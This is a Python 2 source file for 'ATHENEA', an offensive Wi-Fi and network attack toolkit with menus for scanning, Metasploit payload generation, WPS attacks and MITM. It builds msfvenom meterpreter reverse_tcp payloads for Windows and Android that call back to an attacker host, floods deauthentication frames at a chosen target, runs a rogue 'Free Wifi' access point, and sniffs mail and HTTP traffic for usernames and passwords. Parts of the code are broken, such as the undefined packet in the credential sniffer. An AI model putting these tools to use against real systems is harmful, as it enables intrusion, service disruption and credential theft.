#!/usr/bin/python
# -*- encoding: utf-8 -*-

'''
ATHENEA 0.0.1a-3 toolkit 
Written by ringzer0
License: GPL2
'''
__author__ = 'ringzer0'
'''

Requirements: 
--> Python 2.7 interpreter
--> Scapy module
--> scapy-fakeap module --> https://github.com/rpp0/scapy-fakeap
'''
'''

COLOR DEFINITIONS:

'''
# Console colors
W    = '\033[0m'  # white
R    = '\033[31m' # red
G    = '\033[32m' # green
O    = '\033[33m' # orange
B    = '\033[34m' # blue
P    = '\033[35m' # purple
C    = '\033[36m' # cyan
GR   = '\033[37m' # gray
T    = '\033[93m' # tan
END  = '\033[0m'
BOLD = '\033[1m'




import os
import sys
import time
import random
from scapy.all import *
from subprocess import *
from scapy.layers.all import *
from time import sleep
from fakeap import *
import logging
import subprocess
import atheneapscan
logging.basicConfig()
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
try:
    import config
    print(G+"[+] "+B+"Configuration file load properly! :D")
except ImportError as e:
    print(R+"[!]"+O+" Failed trying to load config file (if it's the first run, dont mind, if not, please report the bug): " + str(e)+END)



aps = {}




banner = ('''
     $$$$$$\ $$$$$$$$\ $$\   $$\ $$$$$$$$\ $$\   $$\ $$$$$$$$\  $$$$$$\  
    $$  __$$\ \_$$  __|$$ |  $$ |$$  _____|$$$\  $$ |$$  _____|$$  __$$\ 
    $$ /  $$ |  $$ |   $$ |  $$ |$$ |      $$$$\ $$ |$$ |      $$ /  $$ |
    $$$$$$$$ |  $$ |   $$$$$$$$ |$$$$$\    $$ $$\$$ |$$$$$\    $$$$$$$$ |
    $$  __$$ |  $$ |   $$  __$$ |$$  __|   $$ \$$$$ |$$  __|   $$  __$$ |
    $$ |  $$ |  $$ |   $$ |  $$ |$$ |      $$ |\$$$ |$$ |      $$ |  $$ |
    $$ |  $$ |  $$ |   $$ |  $$ |$$$$$$$$\ $$ | \$$ |$$$$$$$$\ $$ |  $$ |
    \__|  \__|  \__|   \__|  \__|\________|\__|  \__|\________|\__|  \__|                                                   
                ATHENEA 0.0.5b-rc212 Kali Linux toolkit
                            by: ringzer0

        ''')

athenea = B + BOLD + "[athenea~$] " 

def clear():
    os.system("clear")


def prog_check():
    try:
        print(B+"[+] Checking if nmap is installed..."+END)
        p = subprocess.Popen(["nmap"], shell = True)
        p.terminate()
    except OSError as e:
        if e.errno == os.errno.ENOENT:
            print(R+"[!] Nmap not installed,"+G+" i'll do it for you")
            os.system('sudo apt install nmap')
        else:
            print("OK")
    try:
        print(B+"[+] Checking if Zenmap is installed...")
        p = subprocess.Popen(["zenmap"], shell = True)
        p.terminate()
    except OSError as e:
        if e.errno == os.errno.ENOENT:
            print(O+"[!] Zenmap not installed, i'll do it for you")
            os.system('sudo apt install zenmap')
        else:
            print("OK")
    try:
        print(B+"[+] Checking if nmap is installed...")
        p = subprocess.Popen(["netdiscover"], shell = True)
        p.terminate()
    except OSError as e:
        if e.errno == os.errno.ENOENT:
            print(O+"[!] Netdiscover not installed, i'll do it for you")
            os.system('sudo apt install netdiscover')
        else:
            print("OK")
    try:
        print(B+"[+] Checking if nmap is installed...")
        p = subprocess.Popen(["burpsuite"], shell = True)
        p.terminate()
    except OSError as e:
        if e.errno == os.errno.ENOENT:
            print(O+"[!] BurpSuite not installed, you can't use it, download from its website")
        else:
            print("OK")
    try:
        print(B+"[+] Checking if wash is installed...")
        p = subprocess.Popen(["wash"], shell = True)
        p.terminate()
    except OSError as e:
        if e.errno == os.errno.ENOENT:
            print(O+"[!] wash not installed, i'll do it for you")
            os.system('sudo apt install wash')
        else:
            print("OK")
'''

Find the most powerful Wireless Card:

'''



DN = open(os.devnull, 'w')

def get_mon_iface():
    global monitor_on
    monitors, interfaces = iwconfig()
    if len(monitors) > 0:
        monitor_on = True
        return monitors[0]
    else:
        print '['+G+'*'+W+'] Finding the most powerful interface...'
        interface = get_iface(interfaces)
        monmode = start_mon_mode(interface)
        return monmode


def iwconfig():
    monitors = []
    interfaces = {}
    try:
        proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
    except OSError:
        sys.exit('['+R+'-'+R+'] Could not execute "iwconfig"')
    for line in proc.communicate()[0].split('\n'):
        if len(line) == 0: continue # Isn't an empty string
        if line[0] != ' ': # Doesn't start with space
            wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
            if not wired_search: # Isn't wired
                iface = line[:line.find(' ')] # is the interface
                if 'Mode:Monitor' in line:
                    monitors.append(iface)
                elif 'IEEE 802.11' in line:
                    if "ESSID:\"" in line:
                        interfaces[iface] = 1
                    else:
                        interfaces[iface] = 0
    return monitors, interfaces
def get_iface(interfaces):

    scanned_aps = []

    if len(interfaces) < 1:
        sys.exit('['+R+'-'+R+'] No wireless interfaces found, plug one and try again')
    if len(interfaces) == 1:
        for interface in interfaces:
            return interface

    for iface in interfaces:
        count = 0
        proc = Popen(['iwlist', iface, 'scan'], stdout=PIPE, stderr=DN)
        for line in proc.communicate()[0].split('\n'):
            if ' - Address:' in line: # first line in iwlist scan for a new AP
               count += 1
        scanned_aps.append((count, iface))
        print '['+G+'+'+W+'] Networks discovered by '+G+iface+W+': '+T+str(count)+W
    try:
        interface = max(scanned_aps)[1]
        return interface
    except Exception as e:
        for iface in interfaces:
            interface = iface
            print('['+R+'-'+W+'] Minor error:',e)
            print('    Starting monitor mode on '+G+interface+W)
            return interface

def start_mon_mode(interface):
    print '['+G+'+'+W+'] Starting monitor mode on '+G+interface+W
    try:
        os.system('ifconfig %s down' % interface)
        os.system('iwconfig %s mode monitor' % interface)
        os.system('ifconfig %s up' % interface)
        sleep(5)
        raw_input(P+"Use this interface -> "+interface+P+" in -> config.py, if you don't do it, many functionality may not work. Press [return] to continue")
        return interface
    except Exception:
        sys.exit('['+R+'-'+W+'] Could not start monitor mode')

def remove_mon_iface(mon_iface):
    os.system('ifconfig %s down' % mon_iface)
    os.system('iwconfig %s mode managed' % mon_iface)
    os.system('ifconfig %s up' % mon_iface)




class Athenea():
    def __init__(self):
        return
    def main_menu(self):
        print(R+banner+END)
        print(G+'''
            [1]>> Information gathering
            [2]>> Metasploit Payload Generator
            [3]>> WPS Attacks
            [4]>> Wireless Attacks
            [5]>> MITM
            [6]>> Start monitor mode
            [7]>> Stop monitor mode [!](NEVER do it when already deactivated)
            [q]>> Quit
        '''+END)
        try:
            choice = raw_input(athenea)
            clear()
            if choice == "1":
                InfoGatheringMenu().menu()
            elif choice == "2":
                MetasploitMenu().metasploit_menu()
            elif choice == "3":
                WPSAttacks().menu()
            elif choice == "4":
                APScan().menu()
            elif choice == "5":
                MITM().MITM_menu()
            elif choice == "6":
                get_mon_iface()
                sleep(4)
                print(G+"[*] Monitor mode "+O+"started."+END)
                self.main_menu()
            elif choice == "7":
                os.system("service network-manager restart")
                self.main_menu()
            elif choice == "q":
                os.system("service network-manager restart")
                print(G+"[*]"+END+" Thanks for using "+B+ "Athenea"+END+", and remember, "+O+"control is an illusion ... "+END)
                sys.exit(0)
            elif choice == "cookie":
                print(R+"COOKIEMONSTAAAH"+END)
            else:
                print(O+"[W]: Option not recognized"+END)
                return main()

        except KeyboardInterrupt:
            print(R+"\n[+] User cancelled, exiting ... "+END)
class InfoGatheringMenu():
    def menu(self):
        print(G+'''
            === INFORMATION GATHERING ===
                [1]>> Nmap.
                [2]>> Netdiscover.
                [99]>> Return to main menu.
                [q]>> Quit
        '''+END)
        try:
            choice = raw_input(athenea)
            if choice == "1":
                clear()
                Nmap().nmapMenu()
            elif choice == "2":
                Netdiscover().netdiscover()
            elif choice == "99":
                clear()
                Athenea().main_menu()
            elif choice == "q":
                os.system("service network-manager restart")
                print(G+"[*]"+END+" Thanks for using "+B+ "Athenea"+END+", and remember, "+O+"control is an illusion ... "+END)
                sys.exit(0)
            else:
                clear()
                print(O+"[W]: Option not recognized."+END)
                return InfoGatheringMenu().menu()
        except KeyboardInterrupt:
            print(R+"\n[+] User cancelled, exiting ... "+END)
class Nmap():
    def __init__(self):
        self.target_prompt = athenea +G+":nmap>"+" Enter the target to scan: "
    def nmapMenu(self):
        print(G+'''
            === NMAP MENU ===
                [1]>> SYN Scan
                [2]>> TCP SYN/Connect scan
                [3]>> ACK scan
                [4]>> Launch Zenmap
                [99]>> Return to InfoGathering Menu
        '''+END)
        try:
            choice = raw_input(athenea+G+":nmap> "+END)
            if choice == "1":
                clear()
                self.run_syn()
            elif choice == "2":
                clear()
                self.run_tcp()
            elif choice == "3":
                clear()
                self.run_ack()
            elif choice == "4":
                clear()
                os.system("sudo zenmap")
                return main()
            elif choice == "99":
                clear()
                InfoGatheringMenu().menu()
            elif choice == "q":
                os.system("service network-manager restart")
                print(G+"[*]"+END+" Thanks for using "+B+ "Athenea"+END+", and remember, "+O+"control is an illusion ... "+END)
                sys.exit(0)
            else:
                clear()
                print(O+"[W]: Option not recognized."+END)
                return Nmap().nmapMenu()
        except KeyboardInterrupt:
            print(R+"[!] User cancelled, exiting ... "+END)    
    def run_ack(self):
        target = raw_input(self.target_prompt)
        os.system("nmap -sA -v " + target)
        return main()
    def run_tcp(self):
        target = raw_input(self.target_prompt)
        os.system("nmap -sT -v " + target)
        return main()
    def run_syn(self):
        target = raw_input(self.target_prompt)
        os.system("nmap -sS -v " + target)
        return main()


class Netdiscover():
    def __init__(self):
        print(G+"[*] Initializing NetDiscover ..."+END)
    def netdiscover(self):
        os.system("netdiscover")
        return main()

    



class MetasploitMenu():
    def __init__(self):
        self.metasploit_prompt = athenea+G+":metasploit> "
        print("[*] Wait for it...")
    def metasploit_menu(self):
        print(G+'''
            === Metasploit Payload Generator ===
                [1]>> Windows reverse_tcp x86
                [2]>> Windows reverse_tcp x64
                [3]>> Android reverse_tcp (dalvik)
                [99]>> Return to main menu
                [q]>> Quit
            '''+END)
        try:
            option = raw_input(self.metasploit_prompt)
            if option == "1":
                MetasploitExploiting().exploit_gen_win()
                return main()
            elif option == "2":
                MetasploitExploiting().exploit_gen_win_x64()
                return main()
            elif option == "3":
                MetasploitExploiting().exploit_gen_android()
                return main()
            elif option == "99":
                clear()
                Athenea().main_menu()
            elif option == "q":
                os.system("service network-manager restart")
                print(G+"[*]"+END+" Thanks for using "+B+ "Athenea"+END+", and remember, "+O+"control is an illusion ... "+END)
                sys.exit(0)
            else:
                clear()
                print(O+"[W]: Option not recognized."+END)
                self.metasploit_menu()
        except KeyboardInterrupt:
            print(R+"[!] User cancelled, exiting ... "+END)
            sys.exit(0)
class MetasploitExploiting():
    def exploit_gen_win(self):
        LHOST = raw_input(G+"[+] Please enter your LHOST for the reverse shell: "+END)
        LPORT = raw_input(G+"[+] Please enter your LPORT for the reverse shell: "+END)
        total = 1000
        i = 0
        while i < total:
            progress(i, total, status = G+'\n[*] Generating payload... Wait for it...'+END)
            i+=1
            sys.stdout.write("\033[K")
        print(G+"[+] Wait a sec..."+END)
        os.system("sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST="+LHOST+" LPORT="+LPORT+"> payload.exe")
    
    def exploit_gen_win_x64(self):
        LHOST = raw_input("Please enter your LHOST for the reverse shell: ")
        LPORT = raw_input("Please enter your LPORT for the reverse shell: ")
        total = 1000
        i = 0
        while i < total:
            progress(i, total, status = G+'\n[*] Generating payload... Wait for it...'+END)
            i+=1
            sys.stdout.write("\033[K")
        print(G+"[+] Wait a sec..."+END)
        os.system("sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+LHOST+" LPORT="+LPORT+"> payload.exe")

    def exploit_gen_android(self):
        LHOST = raw_input("Please enter your LHOST for the reverse shell: ")
        LPORT = raw_input("Please enter your LPORT for the reverse shell: ")
        total = 1000
        i = 0
        while i < total:
            progress(i, total, status = '\n[*] Generating payload... Wait for it...')
            i+=1
            sys.stdout.write("\033[K")
        print(G+"[+] Wait a sec..."+END)
        os.system("sudo msfvenom -p android/meterpreter/reverse_tcp LHOST="+LHOST+" LPORT="+LPORT+"> payload.apk")

class APScan(object):
    def menu(self):
        print(G+'''
            === Wireless Attacks ===
                [1]>> Athenea AP scan tool with PCAP file write
                [2]>> Athenea AP scan tool (only lists APs)
                [3]>> Hexdump & Summaries of PCAP files (in script root dir)
                [4]>> Athenea Deauth Tool
                [5]>> Email Credential Harvester
                [6]>> (Not so effective yet)FakeAP
                [q]>> Cleanup and quit
            '''+END)
        
        prompt = raw_input(athenea+G+":wireless> ")
        if prompt == "1":
            os.system('python atheneapscan.py -s')
            self.menu() 
        elif prompt == "2":
            atheneapscan.main()
            self.menu()
        elif prompt == "3":
            hexdump_pcap()
        elif prompt == "4":
            RadioTap().deauth()
            self.menu()
        elif prompt == "5":
            email_creds()
            self.menu()
        elif prompt == "6":
            FakeAP().fakeap()
        elif prompt == "q":
            os.system("service network-manager restart")
            print(G+"[*]"+END+" Thanks for using "+B+ "Athenea"+END+", and remember, "+O+"control is an illusion ... "+END)
        else:
            print(O+"[W]: Option not recognized"+END)
            APScan().menu()


class FakeAP():
    def fakeap(self):
        ap = FakeAccessPoint(config.WIRELESS['INTERFACE'], "Free Wifi")
        ap.run()


class WPSAttacks():
    
    def menu(self):
        print(G+'''
            === WPS Attacks ===
                [1]>> Run WASH to scan for WPS Flaws
                [2]>> Pixie Dust attack (reaver)
            '''+END)
        prompt = raw_input(athenea+G+":WPS> ")
        if prompt == "1":
            self.wash()
            self.menu() 
        else:
            print(O+"[W]: Option not recognized"+END) 
            WPSAttacks().menu()           
    def reaver(self):
        return
    def wash(self):
        get_mon_iface()
        sleep(4)
        print(G+"[*] Monitor mode "+O+"started."+END)
        os.system("wash -i "+config.WIRELESS['INTERFACE'])











class MITM():
    def __init__(self):
        self.mitm_prompt = athenea+G+":MITM> "+END

    def MITM_menu(self):
        print('''
                === MITM Menu ===
                    [1]>> WORK IN PROGRESS!
                    [99]>> Return to main menu
 

            ''')

        prompt = raw_input(athenea+G+":MITM> ")
        if prompt == "1":
            return main()
        elif prompt == "99":
            main()
        else:
            print(O+"[!] Option not recognized!"+END)
            MITM().MITM_menu()

    

def hexdump_pcap():
    pcap = rdpcap('capture.pcap')
    pcap.summary()
    os.system("hexdump -C capture.pcap")






def email_creds():
    # check to make sure it has a data payload

    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if 'user' in mail_packet.lower() or 'pass' in mail_packet.lower():
            print '[*] Server: %s' % packet[IP].dst
            print '[*] %s' %packet[TCP].payload
    try:        
        sniff(filter="tcp port 110 or tcp port 25 or tcp port 143 or tcp port 80 or tcp port 8080", prn=email_creds, store=0)
    except:
        print("[!] Something failed")





class RadioTap(object):
    def deauth(self):
        iface = config.Wireless.IFACE
        brdmac = 'ff:ff:ff:ff:ff:ff'
        dstmac = raw_input("[*] Enter the target: ")
        pkt = RadioTap() / Dot11(addr1 = brdmac, addr2 = dstmac, addr3 = dstmac) / Dot11Deauth()

        sendp(pkt, iface = iface, count = 1000000, inter = .2)
    
    def pcap_read(self):
        return
        '''
        TODO: Implement pcap parsing
        '''
    
    def three_way(self):
        return
        '''
        TODO: Implement three way handshake
        '''



def progress(count, total, status=''):
    bar_len = 60
    filled_len = int(round(bar_len * count / float(total)))

    percents = round(100.1 * count / float(total), 1)
    bar = '#' * filled_len + '-' * (bar_len - filled_len)

    sys.stdout.write('\r[%s] %s%s ...%s\r' % (bar, percents, '%', status))
    sys.stdout.flush()
    clear()


def main():
    try:
        athenea = Athenea().main_menu()
    except KeyboardInterrupt:
        print(B+"[+] Cleanup and exiting..."+END)
        os.system("service network-manager restart")
        print(G+"[*]"+END+" Thanks for using "+B+ "Athenea"+END+", and remember, "+O+"control is an illusion ... "+END)

if __name__ == '__main__':

    if os.geteuid():
        sys.exit(R+'[-] Please run as root'+END)
    if not os.path.isfile('config.py'):
        iface = raw_input(G+"Please enter your Wireless interface in MANAGED mode(this first time only): ")
        gateway = raw_input(G+"[+] Please enter your GATEWAY IP(maybe 192.168.1.1): ")
        with open('config.py', 'wb') as cfg:
            cfg.write(str("WIRELESS = {\r\n"))
            cfg.write("\t""\'INTERFACE\' : \'"+str(iface)+"\',\r\n")
            cfg.write("\t""\'GATEWAY\' : \'"+str(gateway)+"\'}\r\n")
            cfg.write(str("VERSION = {\r\n"))
            cfg.write("\t""\'version_latest\' : \'ATHENEA 0.0.5b-rc212\'}\r\n")

            cfg.close()
        main()
    elif os.path.isfile('config.py'):
        prog_check()
        main()
    else:
        first_run()


    
